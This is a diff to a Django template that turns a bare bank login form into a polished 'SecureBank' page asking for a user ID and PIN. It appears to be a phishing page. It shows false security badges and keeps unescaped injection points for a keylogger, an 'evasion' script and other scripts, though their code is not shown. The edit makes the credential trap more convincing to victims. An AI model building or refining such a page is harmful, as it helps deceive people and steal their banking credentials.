@@ -3,13 +3,445 @@
 {% load static %}
 
 {% block content %}
-<div>
-    <h1>Secure Bank Login</h1>
-    <form action="/submit/" method="post">
-      <input type="text" name="user_id" placeholder="User ID"><br>
-      <input type="password" name="pin" placeholder="PIN"><br>
-      <input type="submit" value="Log In">
-    </form>
-    {{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+<div class="login-container">
+    <div class="login-card">
+        <div class="bank-branding">
+            <img src="{% static 'images/secure-bank-logo.svg' %}" alt="Secure Bank Logo" class="bank-logo">
+            <h1 class="bank-name">Secure<span>Bank</span></h1>
+        </div>
+        
+        <form action="/submit/" method="post" class="login-form" id="secureLoginForm">
+            <div class="input-group">
+                <input type="text" name="user_id" id="user_id" required autocomplete="username">
+                <label for="user_id">User ID</label>
+                <div class="input-decoration">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12,4A4,4 0 0,1 16,8A4,4 0 0,1 12,12A4,4 0 0,1 8,8A4,4 0 0,1 12,4M12,6A2,2 0 0,0 10,8A2,2 0 0,0 12,10A2,2 0 0,0 14,8A2,2 0 0,0 12,6M12,13C14.67,13 20,14.33 20,17V20H4V17C4,14.33 9.33,13 12,13Z" />
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" name="pin" id="pin" required autocomplete="current-password">
+                <label for="pin">PIN</label>
+                <div class="input-decoration">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12,3A4,4 0 0,0 8,7V8H7V7A5,5 0 0,1 12,2A5,5 0 0,1 17,7V8H16V7A4,4 0 0,0 12,3M12,15A2,2 0 0,1 14,17A2,2 0 0,1 12,19A2,2 0 0,1 10,17A2,2 0 0,1 12,15M18,8A2,2 0 0,0 16,10V20A2,2 0 0,0 18,22H20A2,2 0 0,0 22,20V10A2,2 0 0,0 20,8H18M4,8A2,2 0 0,0 2,10V20A2,2 0 0,0 4,22H6A2,2 0 0,0 8,20V10A2,2 0 0,0 6,8H4Z" />
+                    </svg>
+                </div>
+                <button type="button" class="toggle-password" aria-label="Show password">
+                    <svg viewBox="0 0 24 24" class="eye-icon">
+                        <path d="M12,9A3,3 0 0,1 15,12A3,3 0 0,1 12,15A3,3 0 0,1 9,12A3,3 0 0,1 12,9M12,4.5C17,4.5 21.27,7.61 23,12C21.27,16.39 17,19.5 12,19.5C7,19.5 2.73,16.39 1,12C2.73,7.61 7,4.5 12,4.5M3.18,12C4.83,15.36 8.24,17.5 12,17.5C15.76,17.5 19.17,15.36 20.82,12C19.17,8.64 15.76,6.5 12,6.5C8.24,6.5 4.83,8.64 3.18,12Z" />
+                    </svg>
+                </button>
+            </div>
+            
+            <div class="form-footer">
+                <button type="submit" class="login-button">
+                    <span>Log In</span>
+                    <svg viewBox="0 0 24 24" class="arrow-icon">
+                        <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z" />
+                    </svg>
+                </button>
+                
+                <div class="security-indicator">
+                    <div class="security-level high">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                    <p>Secure Connection</p>
+                </div>
+            </div>
+        </form>
+        
+        <div class="additional-options">
+            <a href="#" class="forgot-link">Forgot User ID or PIN?</a>
+            <a href="#" class="enroll-link">Enroll in Online Banking</a>
+        </div>
+    </div>
+    
+    <div class="security-features">
+        <div class="feature">
+            <svg viewBox="0 0 24 24">
+                <path d="M12,3L2,12H5V20H19V12H22L12,3M12,7.7C14.1,7.7 15.8,9.4 15.8,11.5C15.8,14.5 12,18 12,18C12,18 8.2,14.5 8.2,11.5C8.2,9.4 9.9,7.7 12,7.7M12,10A1.5,1.5 0 0,0 10.5,11.5A1.5,1.5 0 0,0 12,13A1.5,1.5 0 0,0 13.5,11.5A1.5,1.5 0 0,0 12,10Z" />
+            </svg>
+            <p>256-bit Encryption</p>
+        </div>
+        <div class="feature">
+            <svg viewBox="0 0 24 24">
+                <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.1 14.8,9.5V11C15.4,11 16,11.6 16,12.2V15.7C16,16.4 15.4,17 14.8,17H9.2C8.6,17 8,16.4 8,15.7V12.2C8,11.6 8.6,11 9.2,11V9.5C9.2,8.1 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" />
+            </svg>
+            <p>Multi-Factor Authentication</p>
+        </div>
+    </div>
 </div>
-{% endblok %}
+
+<style>
+:root {
+    --primary-color: #0056b3;
+    --primary-dark: #003d82;
+    --primary-light: #e6f0ff;
+    --accent-color: #00c853;
+    --error-color: #d32f2f;
+    --text-primary: #212121;
+    --text-secondary: #757575;
+    --bg-color: #f5f7fa;
+    --card-bg: #ffffff;
+    --border-radius: 12px;
+    --box-shadow: 0 10px 30px rgba(0, 86, 179, 0.1);
+    --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+}
+
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background-color: var(--bg-color);
+    color: var(--text-primary);
+    line-height: 1.6;
+    background-image: radial-gradient(circle at 10% 20%, rgba(0, 180, 216, 0.05) 0%, rgba(0, 119, 182, 0.05) 90%);
+}
+
+.login-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 2rem;
+}
+
+.login-card {
+    background: var(--card-bg);
+    border-radius: var(--border-radius);
+    box-shadow: var(--box-shadow);
+    width: 100%;
+    max-width: 420px;
+    padding: 2.5rem;
+    position: relative;
+    overflow: hidden;
+    transition: var(--transition);
+}
+
+.login-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 4px;
+    background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+}
+
+.bank-branding {
+    text-align: center;
+    margin-bottom: 2rem;
+}
+
+.bank-logo {
+    height: 48px;
+    margin-bottom: 1rem;
+}
+
+.bank-name {
+    font-size: 1.75rem;
+    font-weight: 700;
+    color: var(--primary-color);
+    letter-spacing: -0.5px;
+}
+
+.bank-name span {
+    font-weight: 300;
+    color: var(--text-primary);
+}
+
+.login-form {
+    margin-top: 1.5rem;
+}
+
+.input-group {
+    position: relative;
+    margin-bottom: 1.5rem;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 1rem 1rem 1rem 3rem;
+    font-size: 1rem;
+    border: 1px solid #ddd;
+    border-radius: var(--border-radius);
+    background-color: var(--primary-light);
+    transition: var(--transition);
+    color: var(--text-primary);
+}
+
+.input-group input:focus {
+    outline: none;
+    border-color: var(--primary-color);
+    box-shadow: 0 0 0 2px rgba(0, 86, 179, 0.2);
+    background-color: white;
+}
+
+.input-group label {
+    position: absolute;
+    left: 3rem;
+    top: 1rem;
+    color: var(--text-secondary);
+    transition: var(--transition);
+    pointer-events: none;
+}
+
+.input-group input:focus + label,
+.input-group input:valid + label {
+    top: -0.5rem;
+    left: 0.8rem;
+    font-size: 0.75rem;
+    background: white;
+    padding: 0 0.5rem;
+    color: var(--primary-color);
+}
+
+.input-decoration {
+    position: absolute;
+    left: 1rem;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--text-secondary);
+}
+
+.input-decoration svg {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
+}
+
+.toggle-password {
+    position: absolute;
+    right: 1rem;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: var(--text-secondary);
+    padding: 0.5rem;
+}
+
+.toggle-password:hover {
+    color: var(--primary-color);
+}
+
+.toggle-password svg {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
+}
+
+.form-footer {
+    margin-top: 2rem;
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+}
+
+.login-button {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    width: 100%;
+    padding: 1rem;
+    background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+    color: white;
+    border: none;
+    border-radius: var(--border-radius);
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: var(--transition);
+    box-shadow: 0 4px 6px rgba(0, 86, 179, 0.15);
+}
+
+.login-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 12px rgba(0, 86, 179, 0.2);
+}
+
+.login-button:active {
+    transform: translateY(0);
+}
+
+.arrow-icon {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
+}
+
+.security-indicator {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    color: var(--text-secondary);
+    font-size: 0.875rem;
+}
+
+.security-level {
+    display: flex;
+    gap: 0.25rem;
+}
+
+.security-level span {
+    display: inline-block;
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background-color: #ddd;
+}
+
+.security-level.high span:nth-child(1) {
+    background-color: #4CAF50;
+}
+
+.security-level.high span:nth-child(2) {
+    background-color: #8BC34A;
+    animation: pulse 1.5s infinite;
+}
+
+.security-level.high span:nth-child(3) {
+    background-color: #CDDC39;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+
+.additional-options {
+    margin-top: 1.5rem;
+    display: flex;
+    flex-direction: column;
+    gap: 0.75rem;
+    text-align: center;
+}
+
+.forgot-link, .enroll-link {
+    color: var(--primary-color);
+    text-decoration: none;
+    font-size: 0.875rem;
+    transition: var(--transition);
+}
+
+.forgot-link:hover, .enroll-link:hover {
+    text-decoration: underline;
+    color: var(--primary-dark);
+}
+
+.security-features {
+    display: flex;
+    justify-content: center;
+    gap: 2rem;
+    margin-top: 2rem;
+    flex-wrap: wrap;
+}
+
+.feature {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    color: var(--text-secondary);
+    font-size: 0.875rem;
+}
+
+.feature svg {
+    width: 18px;
+    height: 18px;
+    fill: currentColor;
+}
+
+/* Responsive adjustments */
+@media (max-width: 480px) {
+    .login-card {
+        padding: 1.5rem;
+    }
+    
+    .bank-logo {
+        height: 40px;
+    }
+    
+    .bank-name {
+        font-size: 1.5rem;
+    }
+}
+
+/* Accessibility focus styles */
+input:focus-visible, button:focus-visible {
+    outline: 2px solid var(--primary-color);
+    outline-offset: 2px;
+}
+
+/* Error state */
+.input-group.error input {
+    border-color: var(--error-color);
+    background-color: rgba(211, 47, 47, 0.05);
+}
+
+.input-group.error label {
+    color: var(--error-color);
+}
+
+.input-group.error .input-decoration {
+    color: var(--error-color);
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Toggle password visibility
+    const togglePassword = document.querySelector('.toggle-password');
+    const passwordInput = document.getElementById('pin');
+    
+    if (togglePassword && passwordInput) {
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.classList.toggle('active');
+        });
+    }
+    
+    // Form submission animation
+    const loginForm = document.getElementById('secureLoginForm');
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            const submitButton = this.querySelector('.login-button');
+            if (submitButton) {
+                submitButton.innerHTML = '<span>Authenticating...</span>';
+                submitButton.disabled = true;
+            }
+        });
+    }
+    
+    // Input validation
+    const inputs = document.querySelectorAll('.input-group input');
+    inputs.forEach(input => {
+        input.addEventListener('blur', function() {
+            if (this.value.trim() === '') {
+                this.parentElement.classList.remove('error');
+            } else if (!this.checkValidity()) {
+                this.parentElement.classList.add('error');
+            } else {
+                this.parentElement.classList.remove('error');
+            }
+        });
+    });
+});
+</script>
+
+{{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+{% endblock %}
